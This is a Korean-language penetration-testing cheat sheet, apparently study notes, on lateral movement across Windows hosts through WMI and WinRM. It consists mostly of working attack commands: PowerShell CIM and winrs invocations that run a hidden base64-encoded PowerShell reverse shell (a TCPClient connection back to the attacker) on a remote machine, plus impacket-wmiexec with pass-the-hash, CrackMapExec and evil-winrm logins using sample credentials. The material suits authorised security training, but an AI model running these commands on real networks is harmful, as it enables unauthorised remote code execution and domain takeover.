wmic(135)는 최근 사용이 중단됨
Windows 10 21H1 에서 중단 (2021.05.18?)
Windows 11 22H2, 23H2 다음에서 중단 (2022.9.20~2023.10.31?)

**전제 조건**
- 로컬 관리자 권한을 갖고 있는 계정/비밀번호/NTLM해시
- **135** 포트 접근 가능 여부

**wmi** 는
→ **wmic.exe** (win)
→ **impacket-wmiexec** (kali)
로 할 수 있다.

**wmic (ps)**
```powershell
$username = '**jen**';
$password = '**Nexus123!**';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
$Options = New-CimSessionOption -Protocol DCOM
$Session = New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options
$Command = 'powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA';
Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};
```

**impacket-wmiexec (kali)**
```powershell
# impacket 
impacket-wmiexec '<domain>/<user>:<pass>'@<FQDN/IP> -shell-type powershell 
impacket-wmiexec 'pci.choi.local/low:Password123!'@192.168.40.161 -shell-type powershell

# Metasploit 
use auxiliary/scanner/smb/impacket/wmiexec

# CrackMapexec 
cme smb <target> -u <user> -p <pass> -d <domain> --exec-method wmiexec -X whoami
cme smb 192.168.40.150 -u Administrator -p 'Password123!' --exec-method wmiexec -X whoami

# PtH 로 접근할 시 
impacket-wmiexec domain.com/user@targetFQDN <command> -hashes '<LM:NT>'
```

WinRS와 같은 빌트인 유틸리티로 작동하는 WinRM을 사용.

> WinRS가 작동하려면, 해당 Domain user가 Administrators 또는 Remote Management Users 그룹에 속해야 한다.

**winrs (cmd)**
```powershell
winrs -r:files04 -u:jen -p:Nexus123!  "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
HUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```

**winrs (powershell)**
```powershell
$username = 'jen';
$password = 'Nexus123!';
$secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
$credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
New-PSSession -ComputerName 192.168.50.73 -Credential $credential
Enter-PSSession 1
# Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
# -- ----            ------------    ------------    -----         -----------------     ------------
#  1 WinRM1          192.168.50.73   RemoteMachine   Opened        Microsoft.PowerShell     Available

# 아래는 수평이동이 완료된 모습
#PS C:\\Users\\jeff> Enter-PSSession 1
#[192.168.50.73]: PS C:\\Users\\jen\\Documents> whoami
#corp\\jen

#[192.168.50.73]: PS C:\\Users\\jen\\Documents> hostname
#FILES04
```

**evil-winrm (linux)**
```powershell
# 기본 로그인
evil-winrm -i <FQDN/ip> -u <user> -p <pass> 
# cert와 pem을 이용한 로그인
evil-winrm -c key.cert -k key.pem -i <target ip> -P 5986 -S
```

**crackmapexec (linux)**
```powershell
crackmapexec winrm <IP/FQDN> -u <user> -p <pass> -d <domain> -X <파워쉘-명령어>
```